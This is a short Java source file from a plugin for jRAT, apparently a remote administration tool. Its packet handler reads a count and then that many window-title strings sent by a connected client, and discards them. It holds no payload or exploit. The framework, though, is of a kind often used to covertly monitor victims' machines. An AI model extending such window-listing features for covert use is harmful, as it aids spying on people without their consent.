package se.jrat.plugin.window.client;

import java.io.DataInputStream;
import java.io.IOException;

import jrat.api.Client;
import jrat.api.net.PacketListener;

public class ListPacketListener extends PacketListener {

	@Override
	public void perform(Client client) {
		try {
			DataInputStream dis = client.getDataInputStream();
			
			int len = dis.readInt();
			
			for (int i = 0; i < len; i++) {
				String title = client.readString();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
